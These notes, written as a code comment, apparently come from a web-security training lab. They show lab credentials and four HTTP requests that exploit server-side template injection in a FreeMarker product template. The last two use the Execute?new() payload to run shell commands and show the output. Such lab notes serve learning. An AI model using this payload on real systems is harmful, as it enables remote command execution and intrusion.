/*
User:pass
content-manager:C0nt3ntM4n4g3r

1) POST /product/template?productId=2 HTTP/2
csrf=H7rjK2TB2YsbKCyQPHckODbfMAuVDD8g&template=
<p>Hurry! Only ${7*7} at ${product.price}.</p>&template-action=preview
//Hurry! Only 49 at $10.37

2) POST /product/template?productId=2 HTTP/2
csrf=H7rjK2TB2YsbKCyQPHckODbfMAuVDD8g&template=
<p>Hurry! Only ${7/0} at ${product.price}.</p>&template-action=preview
//error reveals it is freemarker template engine 

3) POST /product/template?productId=2 HTTP/2 
csrf=H7rjK2TB2YsbKCyQPHckODbfMAuVDD8g&template=
<p>${"freemarker.template.utility.Execute"?new()("id")}</p>&template-action=preview
//uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)

4) POST /product/template?productId=2 HTTP/2 
csrf=H7rjK2TB2YsbKCyQPHckODbfMAuVDD8g&template=
<p> ${"freemarker.template.utility.Execute"?new()("ls")}</p>&template-action=preview
//<p> morale.txt </p>

5) 

*/